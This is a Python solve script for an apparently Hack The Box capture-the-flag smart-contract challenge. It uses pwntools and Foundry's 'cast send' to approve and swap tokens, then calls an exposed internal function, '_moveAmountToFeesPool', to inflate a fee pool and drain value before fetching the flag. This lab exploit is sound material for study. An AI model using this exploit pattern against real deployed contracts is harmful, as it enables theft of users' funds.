#!/usr/bin/env python3
from os import system
from requests import get
import sys
import pwn

def csend(contract: str, fn: str, *args):
    global rpc_url
    global pvk
    print(f"cast send {contract} '{fn}' {' '.join(args)} --rpc-url {rpc_url} --private-key {pvk}")
    system(
        f"cast send {contract} '{fn}' {' '.join(args)} --rpc-url {rpc_url} --private-key {pvk}"
    )


if __name__ == "__main__":
    challHandler = ("0.0.0.0", 8001)
    if len(sys.argv) > 2:
        baseUrl = sys.argv[1]

    # connect to challenge handler and get connection info
    p = pwn.remote("0.0.0.0", 8001)
    p.recvuntil(b"action? ")
    p.sendline(b"1")
    p.recvuntil(b"Here's your connection info:\n\n")
    connection_info = {}
    data = p.recvall()
    p.close()
    lines = data.decode().split('\n')
    for line in lines:
        if line:
            print(line)
            key, value = line.strip().split(': ')
            connection_info[key] = value

    rpc_url = connection_info['RPC URL']
    pvk = connection_info['Player Private Key']
    target = connection_info['Target Contract']
    weth_addr = connection_info['WETH Token Contract']
    htb_addr = connection_info['HTB Token Contract']

    csend(weth_addr, "approve(address,uint256)", target, str(1 * 10**18))
    csend(target, "swap(address,address,uint256)", weth_addr, htb_addr, str(1 * 10**18)) 
    csend(target, "_moveAmountToFeesPool(address,uint256)", htb_addr, str(499 * 10**18)) # any amount is ok to solve but we want to be rich
    csend(htb_addr, "approve(address,uint256)", target, str(1 * 10**18))
    csend(target, "swap(address,address,uint256)", htb_addr, weth_addr, str(5 * 10**17)) # 0.5 HTB  

    p = pwn.remote("0.0.0.0", 8001)
    p.recvuntil(b"action? ")
    p.sendline(b"3")
    flag = p.recvall().decode()
    p.close()
    print(f"\n\n[*] {flag}")